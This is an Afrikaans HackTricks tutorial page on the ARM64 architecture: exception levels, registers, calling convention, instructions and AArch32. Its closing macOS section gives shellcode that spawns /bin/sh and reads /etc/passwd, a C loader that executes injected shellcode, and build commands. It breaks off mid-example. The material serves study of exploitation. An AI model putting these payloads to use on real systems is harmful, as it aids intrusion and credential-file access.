# Inleiding tot ARM64v8

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## **Uitsonderingsvlakke - EL (ARM64v8)**

In die ARMv8-argitektuur definieer uitvoeringsvlakke, bekend as Uitsonderingsvlakke (EL's), die voorregvlak en vermoëns van die uitvoeringsomgewing. Daar is vier uitsonderingsvlakke, wat wissel van EL0 tot EL3, elk met 'n ander doel:

1. **EL0 - Gebruikersmodus**:
* Dit is die minste bevoorregte vlak en word gebruik vir die uitvoering van gewone toepassingskode.
* Toepassings wat op EL0 loop, is geïsoleer van mekaar en van die stelsel sagteware, wat die veiligheid en stabiliteit verbeter.
2. **EL1 - Bedryfstelsel-kernelmodus**:
* Die meeste bedryfstelsel-kernels loop op hierdie vlak.
* EL1 het meer voorregte as EL0 en kan toegang tot stelselhulpbronne verkry, maar met sekere beperkings om stelselintegriteit te verseker.
3. **EL2 - Hipervisormodus**:
* Hierdie vlak word gebruik vir virtualisering. 'n Hipervisor wat op EL2 loop, kan verskeie bedryfstelsels (elk in sy eie EL1) bestuur wat op dieselfde fisiese hardeware loop.
* EL2 bied funksies vir isolasie en beheer van die gevirtualiseerde omgewings.
4. **EL3 - Veilige Monitor-modus**:
* Dit is die mees bevoorregte vlak en word dikwels gebruik vir veilige opstart en vertroude uitvoeringsomgewings.
* EL3 kan toegang tussen veilige en nie-veilige toestande bestuur en beheer (soos veilige opstart, vertroude bedryfstelsel, ens.).

Die gebruik van hierdie vlakke maak dit moontlik om verskillende aspekte van die stelsel op 'n gestruktureerde en veilige manier te bestuur, van gebruikerstoepassings tot die mees bevoorregte stelselsagteware. ARMv8 se benadering tot voorregvlakke help om verskillende stelselkomponente doeltreffend te isoleer, wat die veiligheid en robuustheid van die stelsel verbeter.

## **Registers (ARM64v8)**

ARM64 het **31 algemene doelregisters**, gemerk as `x0` tot `x30`. Elkeen kan 'n **64-bis** (8-byte) waarde stoor. Vir bewerkings wat slegs 32-bis waardes vereis, kan dieselfde registers in 'n 32-bis modus benader word deur die name w0 tot w30 te gebruik.

1. **`x0`** tot **`x7`** - Hierdie word tipies gebruik as skrapsregisters en vir die deurgee van parameters na subroetines.
* **`x0`** dra ook die terugvoerdata van 'n funksie.
2. **`x8`** - In die Linux-kernel word `x8` gebruik as die stelseloproepnommer vir die `svc`-instruksie. **In macOS is x16 die een wat gebruik word!**
3. **`x9`** tot **`x15`** - Meer tydelike registers, dikwels gebruik vir plaaslike veranderlikes.
4. **`x16`** en **`x17`** - **Intra-prosedurale Oproepregisters**. Tydelike registers vir onmiddellike waardes. Hulle word ook gebruik vir indirekte funksie-oproepe en PLT (Procedure Linkage Table) stubs.
* **`x16`** word gebruik as die **stelseloproepnommer** vir die **`svc`**-instruksie in **macOS**.
5. **`x18`** - **Platformregister**. Dit kan as 'n algemene doelregister gebruik word, maar op sommige platforms is hierdie register gereserveer vir platformspefifieke gebruike: Wysiger na die huidige draadomgewingsblok in Windows, of om te wys na die tans **uitvoerende taakstruktuur in die Linux-kernel**.
6. **`x19`** tot **`x28`** - Hierdie is callee-bewaarregisters. 'n Funksie moet hierdie registers se waardes bewaar vir sy aanroeper, sodat hulle in die stapel gestoor en herstel word voordat teruggekeer word na die aanroeper.
7. **`x29`** - **Raamregister** om die stapelraam dop te hou. Wanneer 'n nuwe stapelraam geskep word omdat 'n funksie geroep word, word die **`x29`**-register **in die stapel gestoor** en die nuwe raamregisteradres is (**`sp`**-adres) is **in hierdie register gestoor**.
* Hierdie register kan ook as 'n **algemene doelregister** gebruik word, alhoewel dit gewoonlik gebruik word as verwysing na **plaaslike veranderlikes**.
8. **`x30`** of **`lr`**- **Skakelregister**. Dit hou die **terugkeeradres** wanneer 'n `BL` (Branch with Link) of `BLR` (Branch with Link to Register) instruksie uitgevoer word deur die **`pc`**-waarde in hierdie register te stoor.
* Dit kan ook soos enige ander register gebruik word.
9. **`sp`** - **Stapelwyser**, gebruik om die boonste gedeelte van die stapel dop te hou.
* Die waarde van **`sp`** moet altyd minstens 'n **quadword-uitlyning** behou of 'n uitlyningsuitsondering kan voorkom.
10. **`pc`** - **Programteller**, wat na die volgende instruksie wys. Hierdie register kan slegs opgedateer word deur uitsonderingsgenerasies, uitsonderingsterugkeer en spronge. Die enigste gewone instruksies wat hierdie register kan lees, is sprong met skakelinstruksies (BL, BLR) om die **`pc`**-adres in **`lr`** (Skakelregister) te stoor.
11. **`xzr`** - **Nulregister**. Ook genoem **`wzr`** in sy **32**-bis registervorm. Dit kan gebruik word om die nulwaarde maklik te verkry (gewone bewerking) of om vergelykings uit te voer met behulp van **`subs`** soos **`subs XZR, Xn, #10`** sonder om die resultaatdata enige plek te stoor (in **`xzr`**).

Die **`Wn`**-registers is die **32-bis**-weergawe van die **`Xn`**-register.

### SIMD- en Drijfpuntregisters

Daar is ook nog **32 registers van 128-bis lengte** wat gebruik kan word in geoptimalise
### **PSTATE**

**PSTATE** bevat verskeie proseskomponente wat geserializeer is in die bedryfstelsel-sigbare **`SPSR_ELx`** spesiale register, waar X die **toestemmingsvlak van die geaktiveerde** uitsondering is (dit maak dit moontlik om die prosesstaat te herstel wanneer die uitsondering eindig).\
Hierdie is die toeganklike velde:

<figure><img src="../../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>

* Die **`N`**, **`Z`**, **`C`** en **`V`** kondisie-vlae:
* **`N`** beteken die bewerking het 'n negatiewe resultaat opgelewer
* **`Z`** beteken die bewerking het nul opgelewer
* **`C`** beteken die bewerking het gedra
* **`V`** beteken die bewerking het 'n getekende oorvloei opgelewer:
* Die som van twee positiewe getalle lewer 'n negatiewe resultaat op.
* Die som van twee negatiewe getalle lewer 'n positiewe resultaat op.
* By aftrekking, wanneer 'n groot negatiewe getal van 'n kleiner positiewe getal afgetrek word (of andersom), en die resultaat nie binne die reeks van die gegewe bitgrootte verteenwoordig kan word nie.

{% hint style="warning" %}
Nie al die instruksies werk hierdie vlae by nie. Sommige soos **`CMP`** of **`TST`** doen dit, en ander wat 'n s-suffix het soos **`ADDS`** doen dit ook.
{% endhint %}

* Die huidige **registerbreedte (`nRW`) vlag**: As die vlag die waarde 0 bevat, sal die program in die AArch64-uitvoeringsstaat loop sodra dit hervat word.
* Die huidige **Uitsonderingsvlak** (**`EL`**): 'n Gewone program wat in EL0 loop, sal die waarde 0 hê
* Die **enkelstap-vlag** (**`SS`**): Gebruik deur aflynontleders om enkelstappe te neem deur die SS-vlag na 1 binne **`SPSR_ELx`** te stel deur 'n uitsondering. Die program sal 'n stap neem en 'n enkelstap-uitsondering uitreik.
* Die onwettige-uitsonderingstatus-vlag (**`IL`**): Dit word gebruik om aan te dui wanneer 'n bevoorregte sagteware 'n ongeldige uitsonderingsvlak-oordrag uitvoer, hierdie vlag word na 1 gestel en die verwerker reik 'n onwettige-toestand-uitsondering uit.
* Die **`DAIF`**-vlakke: Hierdie vlae maak dit vir 'n bevoorregte program moontlik om sekere eksterne uitsonderings selektief te maskeer.
* As **`A`** 1 is, beteken dit dat **asynchrone afbreke** geaktiveer sal word. Die **`I`** stel dit in om te reageer op eksterne hardeware **Interrupt-aanvrae** (IRQ's). en die F is verband hou met **Vinnige Onderbrekingsaanvrae** (FIR's).
* Die **stapelwyserkies-vlae** (**`SPS`**): Bevoorregte programme wat in EL1 en hoër loop, kan wissel tussen die gebruik van hul eie stapelwyserregister en die gebruikersmodel een (bv. tussen `SP_EL1` en `EL0`). Hierdie oorskakeling word uitgevoer deur te skryf na die **`SPSel`** spesiale register. Dit kan nie vanaf EL0 gedoen word nie.

## **Oproepkonvensie (ARM64v8)**

Die ARM64-oproepkonvensie spesifiseer dat die **eerste agt parameters** na 'n funksie deurgegee word in die registers **`x0` tot `x7`**. **Addisionele** parameters word op die **stapel** deurgegee. Die **terugkeerwaarde** word teruggegee in die register **`x0`**, of in **`x1`** ook **as dit 128 bits lank is**. Die **`x19`** tot **`x30`** en **`sp`** registers moet behou word oor funksie-oproepe.

Wanneer 'n funksie in samestelling gelees word, soek na die **funksieproloog en epiloog**. Die **proloog** behels gewoonlik die **bewaring van die raampunt (`x29`)**, die **opstel** van 'n **nuwe raampunt**, en die **toekenning van stapelruimte**. Die **epiloog** behels gewoonlik die **herstel van die bewaarde raampunt** en die **terugkeer** uit die funksie.

### Oproepkonvensie in Swift

Swift het sy eie **oproepkonvensie** wat gevind kan word by [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Gewone Instruksies (ARM64v8)**

ARM64-instruksies het gewoonlik die **formaat `opcode dst, src1, src2`**, waar **`opcode`** die **bewerking** is wat uitgevoer moet word (soos `add`, `sub`, `mov`, ens.), **`dst`** die **bestemmingsregister** is waarin die resultaat gestoor sal word, en **`src1`** en **`src2`** die **bronregisters** is. Onmiddellike waardes kan ook gebruik word in plaas van bronregisters.

* **`mov`**: **Beweeg** 'n waarde van die een **register** na die ander.
* Voorbeeld: `mov x0, x1` — Dit beweeg die waarde van `x1` na `x0`.
* **`ldr`**: **Laai** 'n waarde van **geheue** in 'n **register**.
* Voorbeeld: `ldr x0, [x1]` — Dit laai 'n waarde van die geheueposisie wat deur `x1` aangedui word in `x0`.
* **`str`**: **Stoor** 'n waarde van 'n **register** in die **geheue**.
* Voorbeeld: `str x0, [x1]` — Dit stoor die waarde in `x0` in die geheueposisie wat deur `x1` aangedui word.
* **`ldp`**: **Laai Paar van Register**. Hierdie instruksie **laai twee registers** vanaf **opeenvolgende geheueposisies**. Die geheue-adres word tipies gevorm deur 'n verskuiwing by te voeg by die waarde in 'n ander register.
* Voorbeeld: `ldp x0, x1, [x2]` — Dit laai `x0` en `x1` vanaf die geheueposisies by `x2` en `x2 + 8`, onderskeidelik.
* **`stp`**: **Stoor Paar van Register**. Hierdie instruksie **stoor twee registers** na **opeenvolgende geheueposisies**. Die geheue-adres word tipies gevorm deur 'n verskuiwing by te voeg by die waarde in 'n ander register.
* Voorbeeld: `stp x0, x1, [x2]` — Dit stoor `x0` en `x1` na die geheueposisies by `x2` en `x2 + 8`, onderskeidelik.
* **`add`**: **Tel** die waardes van twee registers bymekaar en stoor die resultaat in 'n register.
* Syntaks: add(s) Xn1, Xn2,
* **`bfm`**: **Bit Filed Move**, hierdie operasies **kopieer bits `0...n`** van 'n waarde en plaas hulle in posisies **`m..m+n`**. Die **`#s`** spesifiseer die **linkerste bit** posisie en **`#r`** die **aantal regsomdraaie**.
* Bitveldbeweging: `BFM Xd, Xn, #r`
* Ondertekende Bitveldbeweging: `SBFM Xd, Xn, #r, #s`
* Ondertekende Bitveldbeweging: `UBFM Xd, Xn, #r, #s`
* **Bitveld Uittrek en Invoeg:** Kopieer 'n bitveld vanaf 'n register en kopieer dit na 'n ander register.
* **`BFI X1, X2, #3, #4`** Voeg 4 bits vanaf X2 in vanaf die 3de bit van X1
* **`BFXIL X1, X2, #3, #4`** Trek vanaf die 3de bit van X2 vier bits uit en kopieer dit na X1
* **`SBFIZ X1, X2, #3, #4`** Brei 4 bits vanaf X2 uit en voeg dit in X1 in beginnende by bit posisie 3 en maak die regterbits nul
* **`SBFX X1, X2, #3, #4`** Trek 4 bits uit beginnende by bit 3 vanaf X2, brei dit uit en plaas die resultaat in X1
* **`UBFIZ X1, X2, #3, #4`** Brei 4 bits vanaf X2 uit en voeg dit in X1 in beginnende by bit posisie 3 en maak die regterbits nul
* **`UBFX X1, X2, #3, #4`** Trek 4 bits uit beginnende by bit 3 vanaf X2 en plaas die nul-uitgebreide resultaat in X1.
* **Brei Teken Uit Na X:** Brei die teken (of voeg net 0's by in die ondertekende weergawe) van 'n waarde uit om operasies daarmee uit te voer:
* **`SXTB X1, W2`** Brei die teken van 'n byte **vanaf W2 na X1** (`W2` is die helfte van `X2`) om die 64-bits te vul
* **`SXTH X1, W2`** Brei die teken van 'n 16-bits getal **vanaf W2 na X1** om die 64-bits te vul
* **`SXTW X1, W2`** Brei die teken van 'n byte **vanaf W2 na X1** om die 64-bits te vul
* **`UXTB X1, W2`** Voeg 0's by (ondertekend) by 'n byte **vanaf W2 na X1** om die 64-bits te vul
* **`extr`:** Trek bits uit van 'n gespesifiseerde **paar registers wat gekonkatenasieer is**.
* Voorbeeld: `EXTR W3, W2, W1, #3` Dit sal **W1+W2** konkatenasieer en vanaf bit 3 van W2 tot en met bit 3 van W1 kry en dit in W3 stoor.
* **`bl`**: **Branch** met skakel, gebruik om 'n **subroetine** te **roep**. Stoor die **terugkeeradres in `x30`**.
* Voorbeeld: `bl myFunction` — Dit roep die funksie `myFunction` en stoor die terugkeeradres in `x30`.
* **`blr`**: **Branch** met skakel na register, gebruik om 'n **subroetine** te **roep** waar die teiken in 'n **register** gespesifiseer word. Stoor die terugkeeradres in `x30`.
* Voorbeeld: `blr x1` — Dit roep die funksie waarvan die adres in `x1` bevat word en stoor die terugkeeradres in `x30`.
* **`ret`**: **Terugkeer** vanaf 'n **subroetine**, tipies deur die adres in **`x30`** te gebruik.
* Voorbeeld: `ret` — Dit keer terug vanaf die huidige subroetine deur die terugkeeradres in `x30` te gebruik.
* **`cmp`**: **Vergelyk** twee registers en stel toestandvlagte in. Dit is 'n **alias van `subs`** wat die bestemmingsregister na die nulregister stel. Nuttig om te weet of `m == n`.
* Dit ondersteun dieselfde sintaksis as `subs`
* Voorbeeld: `cmp x0, x1` — Dit vergelyk die waardes in `x0` en `x1` en stel die toestandvlagte dienooreenkomstig in.
* **`cmn`**: **Vergelyk negatiewe** operand. In hierdie geval is dit 'n **alias van `adds`** en ondersteun dieselfde sintaksis. Nuttig om te weet of `m == -n`.
* **tst**: Dit kontroleer of enige van die waardes van 'n register 1 is (werk soos 'n ANDS sonder om die resultaat enige plek te stoor)
* Voorbeeld: `tst X1, #7` Kontroleer of enige van die laaste 3 bits van X1 1 is
* **`b.eq`**: **Spring as gelyk**, gebaseer op die vorige `cmp` instruksie.
* Voorbeeld: `b.eq label` — As die vorige `cmp` instruksie twee gelyke waardes gevind het, spring dit na `label`.
* **`b.ne`**: **Spring as Nie Gelyk**. Hierdie instruksie kontroleer die toestandvlagte (wat deur 'n vorige vergelykingsinstruksie gestel is) en as die vergelykte waardes nie gelyk was nie, spring dit na 'n etiket of adres.
* Voorbeeld: Na 'n `cmp x0, x1` instruksie, `b.ne label` — As die waardes in `x0` en `x1` nie gelyk was nie, spring dit na `label`.
* **`cbz`**: **Vergelyk en Spring op Nul**. Hierdie instruksie vergelyk 'n register met nul en as hulle gelyk is, spring dit na 'n etiket of adres.
* Voorbeeld: `cbz x0, label` — As die waarde in `x0` nul is, spring dit na `label`.
* **`cbnz`**: **Vergelyk en Spring op Nie-Nul**. Hierdie instruksie vergelyk 'n register met nul en as hulle nie gelyk is nie, spring dit na 'n etiket of adres.
* Voorbeeld: `cbnz x0, label` — As die waarde in `x0` nie-nul is nie, spring dit na `label`.
* **`adrp`**: Bereken die **bladsy-adres van 'n simbool** en stoor dit in 'n register.
* Voorbeeld: `adrp x0, symbol` — Dit bereken die bladsy-adres van `symbol` en stoor dit in `x0`.
* **`ldrsw`**: **Laai** 'n ondertekende **32-bits** waarde vanaf geheue en **brei dit uit tot 64** bits.
* Voorbeeld: `ldrsw x0, [x1]` — Dit laai 'n ondertekende 32-bits waarde vanaf die geheueposisie wat deur `x1` aangedui word, brei dit uit tot 64 bits en stoor dit in `x0`.
* **`stur`**: **Stoor 'n registerwaarde na 'n geheueposisie**, met 'n verskuiwing vanaf 'n ander register.
* Voorbeeld: `stur x0, [x1, #4]` — Dit stoor die waarde in `x0` in die geheue-adres wat 4 byte groter is as die adres wat tans in `x1` is.
* **`svc`** : Maak 'n **stelseloproep**. Dit staan vir "Supervisor Call". Wanneer die verwerker hierdie instruksie uitvoer, skakel dit oor van gebruikersmodus na kernmodus en spring na 'n spesifieke plek in die geheue waar die **kern se stelseloproephantering** kode geleë is.
*   Voorbeeld:

```armasm
mov x8, 93  ; Laai die stelseloproepnommer vir afsluiting (93) in register x8.
mov x0, 0   ; Laai die afsluitstatuskode (0) in register x0.
svc 0       ; Maak die stelseloproep.
```
### **Funksie Proloog**

1. **Berg die skakelregister en raamverwysing op die stoorplek op**:

{% code overflow="wrap" %}
```armasm
stp x29, x30, [sp, #-16]!  ; stoor die paar x29 en x30 op die stoorplek en verminder die stooraanwyser
```
{% endcode %}
2. **Stel die nuwe raamverwysing op**: `mov x29, sp` (stel die nuwe raamverwysing op vir die huidige funksie)
3. **Ken ruimte op die stoorplek toe vir plaaslike veranderlikes** (indien nodig): `sub sp, sp, <grootte>` (waar `<grootte>` die aantal bytes is wat benodig word)

### **Funksie Epiloog**

1. **Deallokeer plaaslike veranderlikes (indien enige toegewys was)**: `add sp, sp, <grootte>`
2. **Herstel die skakelregister en raamverwysing**:

{% code overflow="wrap" %}
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Terugkeer**: `ret` (gee beheer terug aan die oproeper deur die adres in die skakelregister te gebruik)

## AARCH32 Uitvoeringsstatus

Armv8-A ondersteun die uitvoering van 32-bis-programme. **AArch32** kan in een van **twee instruksiestelle** uitgevoer word: **`A32`** en **`T32`**, en kan tussen hulle skakel deur middel van **`interworking`**.\
**Bevoorregte** 64-bis-programme kan die **uitvoering van 32-bis-programme skeduleer** deur 'n uitsonderingsvlak-oordrag na die laer bevoorregte 32-bis-program uit te voer.\
Let daarop dat die oorgang van 64-bis na 32-bis plaasvind met 'n verlaging van die uitsonderingsvlak (byvoorbeeld 'n 64-bis-program in EL1 wat 'n program in EL0 teweegbring). Dit word gedoen deur die **bit 4 van** **`SPSR_ELx`** spesiale register **op 1** te stel wanneer die `AArch32` prosesdraad gereed is om uitgevoer te word, en die res van `SPSR_ELx` stoor die **`AArch32`** programme se CPSR. Dan roep die bevoorregte proses die **`ERET`** instruksie aan sodat die verwerker oorgaan na **`AArch32`** en in A32 of T32 binnegaan, afhangende van CPSR**.**

Die **`interworking`** vind plaas deur die J- en T-bits van CPSR te gebruik. `J=0` en `T=0` beteken **`A32`** en `J=0` en `T=1` beteken **T32**. Dit kom neer op die stelling van die **laagste bit as 1** om aan te dui dat die instruksiestel T32 is.\
Dit word ingestel tydens die **interworking takinstruksies**, maar kan ook direk met ander instruksies ingestel word wanneer die PC as die bestemmingsregister ingestel word. Voorbeeld:

'n Ander voorbeeld:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registers

Daar is 16 32-bit registers (r0-r15). Vanaf r0 tot r14 kan hulle gebruik word vir enige operasie, maar sommige van hulle is gewoonlik gereserveer:

- `r15`: Programteller (altyd). Bevat die adres van die volgende instruksie. In A32 huidige + 8, in T32, huidige + 4.
- `r11`: Raampunt
- `r12`: Intra-prosedurale oproepregister
- `r13`: Stakpunt
- `r14`: Skakelregister

Verder word registerwaardes ondersteun in "gebankte registre". Dit is plekke wat die registerwaardes stoor om vinnige kontekswisseling in uitsonderingshantering en bevoorregte operasies moontlik te maak, om die nodigheid om registerwaardes handmatig te stoor en herstel te vermy. Dit word gedoen deur die prosessorstatus van die CPSR na die SPSR van die prosessormodus waarin die uitsondering geneem word, te stoor. By die terugkeer van die uitsondering word die CPSR herstel vanaf die SPSR.

### CPSR - Huidige Programstatusregister

In AArch32 werk die CPSR soortgelyk aan PSTATE in AArch64 en word dit ook gestoor in SPSR_ELx wanneer 'n uitsondering geneem word om die uitvoering later te herstel:

<figure><img src="../../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

Die velde is verdeel in verskeie groepe:

- Application Program Status Register (APSR): Aritmetiese vlae en toeganklik vanaf EL0
- Uitvoeringsstatusregisters: Prosessgedrag (bestuur deur die bedryfstelsel).

#### Application Program Status Register (APSR)

- Die `N`, `Z`, `C`, `V`-vlae (soos in AArch64)
- Die `Q`-vlaag: Dit word op 1 gestel wanneer daar tydens die uitvoering van 'n gespesialiseerde versadigende aritmetiese instruksie **integer versadiging plaasvind**. Sodra dit op `1` gestel is, sal dit die waarde behou totdat dit handmatig op 0 gestel word. Daar is ook geen instruksie wat sy waarde implisiet toets nie, dit moet handmatig gelees word.
- `GE` (Groter as of gelyk aan) Vlae: Dit word gebruik in SIMD (Enkele Instruksie, Meervoudige Data) operasies, soos "parallelle optelling" en "parallelle aftrekking". Hierdie operasies maak dit moontlik om meerdere datapunte in een instruksie te verwerk.

Byvoorbeeld, die `UADD8`-instruksie tel vier pare byte (vanaf twee 32-bit operandi) parallel op en stoor die resultate in 'n 32-bit register. Dit stel dan die `GE`-vlae in die `APSR` in op grond van hierdie resultate. Elke GE-vlag stem ooreen met een van die byte-optellings en dui aan of die optelling vir daardie bytepaar **oorvloei** het.

Die `SEL`-instruksie gebruik hierdie GE-vlae om voorwaardelike aksies uit te voer.

#### Uitvoeringsstatusregisters

- Die `J`- en `T`-bits: `J` moet 0 wees en as `T` 0 is, word die A32-instruksiestel gebruik, en as dit 1 is, word die T32 gebruik.
- IT Blokstatusregister (`ITSTATE`): Dit is die bits vanaf 10-15 en 25-26. Hulle stoor voorwaardes vir instruksies binne 'n `IT`-voorafgegaan groep.
- `E`-bit: Dui die **endianness** aan.
- Modus- en Uitsonderingsmasker-bits (0-4): Hulle bepaal die huidige uitvoeringsstatus. Die vyfde een dui aan of die program as 32-bit (1) of 64-bit (0) uitgevoer word. Die ander 4 verteenwoordig die tans gebruikte uitsonderingsmodus (wanneer 'n uitsondering plaasvind en hanteer word). Die getalstel dui die huidige prioriteit aan in die geval 'n ander uitsondering geaktiveer word terwyl hierdie een hanteer word.

<figure><img src="../../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>

- `AIF`: Sekere uitsonderings kan gedeaktiveer word deur die bits `A`, `I`, `F` te gebruik. As `A` 1 is, beteken dit dat asynchrone afbreek geaktiveer sal word. Die `I` stel dit in om te reageer op eksterne hardeware-onderbrekingsversoeke (IRQ's). En die F is verband hou met vinnige onderbrekingsversoeke (FIR's).

## macOS

### BSD-sysoproepe

Kyk na [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). BSD-sysoproepe sal hê **x16 > 0**.

### Mach Traps

Kyk na [**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html). Mach traps sal hê **x16 < 0**, so jy moet die nommers van die vorige lys met 'n min-teken noem: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.

Jy kan ook **`libsystem_kernel.dylib`** in 'n disassembler nagaan om uit te vind hoe om hierdie (en BSD) sysoproepe te noem:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
Soms is dit makliker om die **gedekomponeerde** kode van **`libsystem_kernel.dylib`** te kontroleer as om die **bronkode** te kontroleer, omdat die kode van verskeie syscalls (BSD en Mach) gegenereer word deur skripte (kyk na kommentaar in die bronkode), terwyl jy in die dylib kan vind wat geroep word.
{% endhint %}

### Shellkodes

Om te kompileer:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Om die bytes te onttrek:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>C-kode om die shellcode te toets</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Skulp

Geneem van [**hier**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) en verduidelik.

{% tabs %}
{% tab title="met adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% tab title="met stapel" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}
{% endtabs %}

#### Lees met kat

Die doel is om `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` uit te voer, so die tweede argument (x1) is 'n reeks van parameters (wat in die geheue 'n stapel van die adresse beteken).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Roep die bevel aan met sh vanuit 'n vurk sodat die hoofproses nie doodgemaak word nie
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
